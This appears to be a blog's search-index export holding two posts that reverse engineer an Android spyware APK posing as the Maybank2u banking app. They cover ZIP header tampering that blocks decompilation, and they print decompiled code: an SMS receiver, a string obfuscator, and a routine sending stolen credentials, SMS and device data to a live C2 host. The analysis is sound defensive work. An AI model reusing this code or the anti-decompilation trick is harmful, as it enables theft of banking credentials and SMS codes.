[{"content":"Description This is a continuation of the Android Spyware Maybank2u APK where I dig deeper specifically on the decompilation failure. Although several solution was found previously, I did not fully understand on the issue and thats the reason I\u0026rsquo;m having the research here\nThe Issue The APK was not able to decompile as shown below.\n1 2 3 4 5 6 unzip Maybank2u.apk Archive: Maybank2u.apk [Maybank2u.apk] AndroidManifest.xml password: skipping: AndroidManifest.xml incorrect password inflating: classes.dex ...[snip]... 1 2 3 4 5 6 7 jadx .\\Maybank2u.apk INFO - loading ... ERROR - Failed to process zip file: .\\Maybank2u.apk jadx.core.utils.exceptions.JadxRuntimeException: Failed to process zip file: .\\Maybank2u.apk ...[snip]... Caused by: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... 1 2 3 4 5 6 7 apktool d .\\Maybank2u.apk I: Using Apktool 2.10.0 on Maybank2u.apk with 8 thread(s). Exception in thread \u0026#34;main\u0026#34; brut.androlib.exceptions.AndrolibException: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... Caused by: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... Caused by: java.util.zip.ZipException: invalid CEN header (encrypted entry) Analysis To fully understand that happened, I used apkInspector tool to understand the information behind it.\n1 2 3 4 5 6 7 8 9 10 11 apkInspector -apk Maybank2u.apk -a apkInspector Version: 1.3.5 Copyright 2025 erev0s \u0026lt;projects@erev0s.com\u0026gt; ------------ Results for Maybank2u.apk: ------------ The zip structure was tampered with using the following patterns: differing headers: [\u0026#39;general_purpose_bit_flag\u0026#39;] The AndroidManifest.xml file does not seem to be tampered structurally. Based on this information, it mentioned that the \u0026ldquo;general purpose bit flag\u0026rdquo; (GPBF) was different. After researching on this, I found a good article that discussed about it: https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html.\nAfter understanding it, the \u0026ldquo;general purpose bit flag\u0026rdquo; is something in the local file headers and central directory file header.\nLocal file headers (LFH) Here\u0026rsquo;s how a local file headers looks like:\nbased on the images, there are several important information\nsignature is 0x0 to 0x3 and it is always \\x50\\x4b\\x03\\x04 the GPBF AKA flag is 0x06 and 0x07 Central Directory file headers (CDFH) Here\u0026rsquo;s how a central directory file headers looks like:\nsignature is 0x0 to 0x3 and it is always \\x50\\x4b\\x01\\x02 the GPBF AKA flag is 0x08 and 0x09 Comparison of LFH and CDFH on the APK To compare the LFH and CDFH, I will first need to identify where the information is located. I used both xxd and https://hexed.it/.\n1 2 3 4 5 xxd -s 0x0017E000 -l 78 Maybank2u.apk 00000000: 504b 0304 1400 0808 0800 0e1b 955a cc51 PK...........Z.Q 00000010: ef3a e508 0000 4821 0000 1300 0000 416e .:....H!......An 00000020: 6472 6f69 644d 616e 6966 6573 742e 786d droidManifest.xm 00000030: 6cad 583b 701b d715 bd0b f003 fe49 c9b1 l.X;p........I.. 1 2 3 4 5 6 xxd -s 0x0017E000 -l 80 Maybank2u.apk 0017e000: 504b 0102 1400 1400 0908 0800 0e1b 955a PK.............Z 0017e010: cc51 ef3a e508 0000 4821 0000 1300 0000 .Q.:....H!...... 0017e020: 0000 0000 0000 0000 0000 0000 0000 416e ..............An 0017e030: 6472 6f69 644d 616e 6966 6573 742e 786d droidManifest.xm 0017e040: 6c50 4b01 0214 0014 0008 0808 000e 1b95 lPK............. Noticed that:\nthe GPBF for LFH AndroidManifest.xml is \\x08\\x08 in position 0x06 and 0x07 the GPBF for CBFH AndroidManifest.xml is \\x09\\x08 in position 0x08 and 0x09 Based on this, it is confirmed that there\u0026rsquo;s a different in the GPBF. This is the main reason why it is unable to decompile.\nWhy password prompt when using unzip ? Password was asked when trying to unzip the APK file.\n1 2 3 unzip Maybank2u.apk Archive: Maybank2u.apk [Maybank2u.apk] AndroidManifest.xml password: This is because of the GPBF. the GPBF is in hex number but it actually have meaning on the binary number.\n\\x08\\x08 = 00001000 00001000 (little endian) bit 3 is set which is data descriptor bit 11 is set which is language encoding (UTF-8) \\x09\\x08 = 00001000 00001001 (little endian) bit 0 is set which is encrypted file bit 3 is set which is data descriptor bit 11 is set which is language encoding (UTF-8) So because of this minor changes, the APK has changed from unencrypted to encrypted and the confused the ZIP.\nHow to fix it ? Well this is simple because now I understand about it. Just changed the value in CDFH \\x09\\x08 back to the value in LFH \\x08\\x08 will do the trick. Other methods includes using the zip to try fixing it or use the latest jadx version will do.\n","permalink":"https://callmeks.github.io/posts/android-spyware-further-analysis/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a continuation of the \u003ca href=\"../android-spyware-maybank2u-apk\"\u003eAndroid Spyware Maybank2u APK\u003c/a\u003e where I dig deeper specifically on the decompilation failure. Although several solution was found previously, I did not fully understand on the issue and thats the reason I\u0026rsquo;m having the research here\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"the-issue\"\u003eThe Issue\u003c/h2\u003e\n\u003cp\u003eThe APK was not able to decompile as shown below.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e6\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eunzip Maybank2u.apk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eArchive:  Maybank2u.apk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eMaybank2u.apk\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e AndroidManifest.xml password:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   skipping: AndroidManifest.xml     incorrect password\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  inflating: classes.dex\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esnip\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-1-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-1-1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-1-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-1-2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-1-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-1-3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-1-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-1-4\"\u003e4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-1-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-1-5\"\u003e5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-1-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-1-6\"\u003e6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-1-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-1-7\"\u003e7\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ejadx .\u003cspan style=\"color:#ae81ff\"\u003e\\M\u003c/span\u003eaybank2u.apk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eINFO  - loading ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eERROR - Failed to process zip file: .\u003cspan style=\"color:#ae81ff\"\u003e\\M\u003c/span\u003eaybank2u.apk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ejadx.core.utils.exceptions.JadxRuntimeException: Failed to process zip file: .\u003cspan style=\"color:#ae81ff\"\u003e\\M\u003c/span\u003eaybank2u.apk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esnip\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCaused by: java.util.zip.ZipException: invalid CEN header \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eencrypted entry\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esnip\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-2-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-2-1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-2-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-2-2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-2-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-2-3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-2-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-2-4\"\u003e4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-2-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-2-5\"\u003e5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-2-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-2-6\"\u003e6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-2-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-2-7\"\u003e7\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapktool d .\u003cspan style=\"color:#ae81ff\"\u003e\\M\u003c/span\u003eaybank2u.apk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI: Using Apktool 2.10.0 on Maybank2u.apk with \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e thread\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003es\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eException in thread \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;main\u0026#34;\u003c/span\u003e brut.androlib.exceptions.AndrolibException: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eencrypted entry\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esnip\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCaused by: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eencrypted entry\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esnip\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCaused by: java.util.zip.ZipException: invalid CEN header \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eencrypted entry\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eTo fully understand that happened, I used \u003ccode\u003eapkInspector\u003c/code\u003e tool to understand the information behind it.\u003c/p\u003e","title":"Android Spyware Further Analysis"},{"content":"Description I asked this APK from Fareed after I saw his post in X and decided to have a look into it.\nAnalyzing APK This is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first.\nStatic Analysis I started out with both jadx and apktool but it has some error which fail to decompile the APK.\n1 2 3 4 5 6 7 jadx .\\Maybank2u.apk INFO - loading ... ERROR - Failed to process zip file: .\\Maybank2u.apk jadx.core.utils.exceptions.JadxRuntimeException: Failed to process zip file: .\\Maybank2u.apk ...[snip]... Caused by: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... 1 2 3 4 5 6 7 apktool d .\\Maybank2u.apk I: Using Apktool 2.10.0 on Maybank2u.apk with 8 thread(s). Exception in thread \u0026#34;main\u0026#34; brut.androlib.exceptions.AndrolibException: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... Caused by: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... Caused by: java.util.zip.ZipException: invalid CEN header (encrypted entry) Based on both the error, I somehow could not decompile it due to this invalid CEN header. After poking around, I found out something interesting.\n1 2 3 4 5 6 unzip Maybank2u.apk Archive: Maybank2u.apk [Maybank2u.apk] AndroidManifest.xml password: skipping: AndroidManifest.xml incorrect password inflating: classes.dex ...[snip]... Somehow, the AndroidManifest.xml is password protected while the remaining files can be unzipped. AndroidManifest.xml is something important as it contains a lot of information. Although I could not get the AndroidManifest.xml, I still have chances to understand the application as classes.dex is extracted from the zip file. It is possible to open classes.dex in jadx-gui without any error. The only downside is I will have to understand the code without AndroidManifest.xml.\n1 2 3 4 5 if (getSharedPreferences(\u0026#34;app_data_launch_f\u0026#34;, 0).getBoolean(\u0026#34;isFirstRun\u0026#34;, true)) { AlertDialog.Builder builder = new AlertDialog.Builder(this); String locale = Locale.getDefault().toString(); int hashCode3 = locale.hashCode(); String str2 = \u0026#34;Ruxsatlar talab qilinadi\u0026#34;; Based on what I understand from the code, this is checking if the isFirstRun value is true or not in shared preferences. If the condition is met, it will request permission for the application and allow the application to work as intended. Something interesting is it uses Ruxsatlar talab qilinadi which is Uzbek and Разрешить which is Russian words aside from English.\n1 N8.a(this, new O8(-425911099, new Bn(this, i), true)); If I did not meet the condition mentioned above, the application will instead start this a function which seems like some other kind of interface.\n1 startService(new Intent(this, (Class\u0026lt;?\u0026gt;) MgRKn55kcebb482e4b514772964e31012d0b1157.class)); One more things that I noticed is on the end of the onCreate function, there\u0026rsquo;s this startService function which send intent to the class.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public final class MgRKn55kcebb482e4b514772964e31012d0b1157 extends Service { public RE Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b; public final IBinder GZhJfnKSd3bcf0449614b4f9f971198a1927183cd(Intent intent) { return null; } public final int L3SIZ9rLe3f0e2e3fd01496286efcad0fda547f6(Intent intent, int i, int i2) { this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b = new RE(); IntentFilter intentFilter = new IntentFilter(); intentFilter.setPriority(1000); intentFilter.addAction(\u0026#34;android.provider.Telephony.SMS_RECEIVED\u0026#34;); RE re = this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b; if (re != null) { registerReceiver(re, intentFilter); return 2; } AbstractC0641jk.U(\u0026#34;receiver\u0026#34;); throw null; } @Override // android.app.Service public final void onDestroy() { RE re = this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b; if (re == null) { AbstractC0641jk.U(\u0026#34;receiver\u0026#34;); throw null; } unregisterReceiver(re); super.onDestroy(); } } This class looks like a service that will trigger the broadcast receiver onReceive function to receive SMS messages. Aside from that, I really have no idea at the moment and decided to perform dynamic analysis\nDynamic Analysis I started out by installing the malicious APK into my emulator.\nI then start to play around with the application.\nIt does requesting permission, let see what permission it is asking.\nIt is requesting permission for contact, phone calls, SMS and running in background. These permissions are dangerous and should not be allowed especially when the APK is suspicious. But since I am performing analysis, I will need to provide these permissions in order to understand the application.\nLooking into the first page, It is a login page which asked for username and password. I then tried to have a look at the code which have the keywords of username, password, login.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public final Object c() { MainActivity mainActivity; Uo uo = this.g; if (!((Boolean) uo.getValue()).booleanValue()) { Uo uo2 = this.h; int length = ((String) uo2.getValue()).length(); Uo uo3 = this.i; if (length \u0026lt; 6) { uo3.setValue(\u0026#34;Input Username between 6 and 16 characters.\u0026#34;); } else { Uo uo4 = this.j; if (((String) uo4.getValue()).length() \u0026lt; 6) { uo3.setValue(\u0026#34;Invalid username/password.\u0026#34;); } I found one that looks interesting which it checks if the input and will provide some feedback if the input is 6 or lower.\nLook\u0026rsquo;s like the code is for username and password length. If both of the input meet the requirement of 7 characters and above, it will perform something which has very long code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public static String b(String str) { int i; int i2; int i3; AbstractC0641jk.v(str, \u0026#34;input\u0026#34;); byte[] bytes = str.getBytes(AbstractC0755m7.a); AbstractC0641jk.u(bytes, \u0026#34;this as java.lang.String).getBytes(charset)\u0026#34;); String encodeToString = Base64.encodeToString(bytes, 2); AbstractC0641jk.s(encodeToString); StringBuilder sb = new StringBuilder(); int length = encodeToString.length(); for (int i4 = 0; i4 \u0026lt; length; i4++) { char charAt = encodeToString.charAt(i4); if (Character.isLowerCase(charAt)) { i2 = 97; if (\u0026#39;a\u0026#39; \u0026lt;= charAt \u0026amp;\u0026amp; charAt \u0026lt; \u0026#39;{\u0026#39;) { i3 = (charAt - \u0026#39;Y\u0026#39;) % 26; i = i3 + i2; charAt = (char) i; sb.append(charAt); } } if (!Character.isLowerCase(charAt) || 1072 \u0026gt; charAt || charAt \u0026gt;= 1104) { if (Character.isUpperCase(charAt)) { i2 = 65; if (\u0026#39;A\u0026#39; \u0026lt;= charAt \u0026amp;\u0026amp; charAt \u0026lt; \u0026#39;[\u0026#39;) { i3 = (charAt - \u0026#39;9\u0026#39;) % 26; i = i3 + i2; } } if (Character.isUpperCase(charAt)) { i2 = 1040; if (1040 \u0026lt;= charAt \u0026amp;\u0026amp; charAt \u0026lt; 1072) { i3 = (charAt - 1032) % 32; i = i3 + i2; } } if (Character.isDigit(charAt)) { i = ((charAt - \u0026#39;(\u0026#39;) % 10) + 48; } else { sb.append(charAt); } } else { i = ((charAt - 1064) % 32) + 1072; } charAt = (char) i; sb.append(charAt); } String sb2 = sb.toString(); AbstractC0641jk.u(sb2, \u0026#34;toString(...)\u0026#34;); return sb2; } I noticed that this function will be triggered after some information is collected. This function looks like base64 encode the strings and character permutation.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public void d(JSONObject jSONObject, boolean z) { String concat; Xp xp = new Xp(); if (z) { byte[] decode = Base64.decode(\u0026#34;aHR0cHM6Ly93ZWVkb29tLm5ldA==\u0026#34;, 0); AbstractC0641jk.s(decode); concat = new String(decode, AbstractC0755m7.a).concat(\u0026#34;/minit\u0026#34;); } else { byte[] decode2 = Base64.decode(\u0026#34;aHR0cHM6Ly93ZWVkb29tLm5ldA==\u0026#34;, 0); AbstractC0641jk.s(decode2); concat = new String(decode2, AbstractC0755m7.a).concat(\u0026#34;/multipush\u0026#34;); } try { Gl gl = new Gl(); gl.m(concat); Pattern pattern = Vn.c; Vn z2 = AbstractC0597ik.z(\u0026#34;application/json; charset=utf-8\u0026#34;); String jSONObject2 = jSONObject.toString(); AbstractC0641jk.u(jSONObject2, \u0026#34;toString(...)\u0026#34;); gl.l(\u0026#34;POST\u0026#34;, AbstractC0597ik.s(z2, jSONObject2)); byte[] decode3 = Base64.decode(\u0026#34;QmV0YQ==\u0026#34;, 0); AbstractC0641jk.s(decode3); String b = b(new String(decode3, AbstractC0755m7.a)); C0236ai c0236ai = (C0236ai) gl.c; c0236ai.getClass(); AbstractC0737lq.o(\u0026#34;auth\u0026#34;); AbstractC0737lq.t(b, \u0026#34;auth\u0026#34;); c0236ai.a(\u0026#34;auth\u0026#34;, b); String string = Settings.Secure.getString(this.a.getContentResolver(), \u0026#34;android_id\u0026#34;); AbstractC0641jk.u(string, \u0026#34;getString(...)\u0026#34;); String b2 = b(string); C0236ai c0236ai2 = (C0236ai) gl.c; c0236ai2.getClass(); AbstractC0737lq.o(\u0026#34;id\u0026#34;); AbstractC0737lq.t(b2, \u0026#34;id\u0026#34;); c0236ai2.a(\u0026#34;id\u0026#34;, b2); new C0563hu(xp, gl.e()).e(new Yw(11)); } catch (Exception unused) { } } I then noticed another function is triggered. This function looks like some HTTP URL connection where it use POST method to send a JSON object. The URL is https://weedoom.net and it has 2 endpoint /minit and /multipush. Since the function input c0044Fe.d(jSONObject, true); is true, the /multipush is not likely used in this case. After understanding all, I tried to send a fake creds and see it it\u0026rsquo;s correct.\nAfter providing an input 7 or more in both usernamd and password field, I was redirected to this page. I then looked into my web proxy and see if any request is sent.\nA request was sent to https://weedoom.net/minit. I then tried to decode based on the function b and see what kind of information they have collected.\nusername and password list of application installed SMS received most likely SIM card information Looking into the screenshot, I also noticed that https://weedoom.net/multipush was triggered from somewhere else. It has something to do with the broadcast receiver where when a new SMS is received, it will send the information to https://weedoom.net/multipush.\nNew Update It is possible to decompile using the latest unstable release jadx or jadx-gui. Here\u0026rsquo;s the link to get the latest unstable release. https://nightly.link/skylot/jadx/workflows/build-artifacts/master\nI found out another easier method by using zip command.\n1 2 3 zip -FF Maybank2u.apk --out yeehar.apk Fix archive (-FF) - salvage what can Found end record (EOCDR) - says expect single disk archive After it completes, just use any version of jadx or apktool and it should now working as intended.\nThings I learned from the APK you can protect AndroidManifest.xml ??? (latest jadx is immune to this) reverse engineer a simple malicious APK ","permalink":"https://callmeks.github.io/posts/android-spyware-maybank2u-apk/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI asked this APK from Fareed after I saw his post in \u003ca href=\"https://x.com/frdfzi/status/1914682801674240012\"\u003eX\u003c/a\u003e and decided to have a look into it.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"analyzing-apk\"\u003eAnalyzing APK\u003c/h2\u003e\n\u003cp\u003eThis 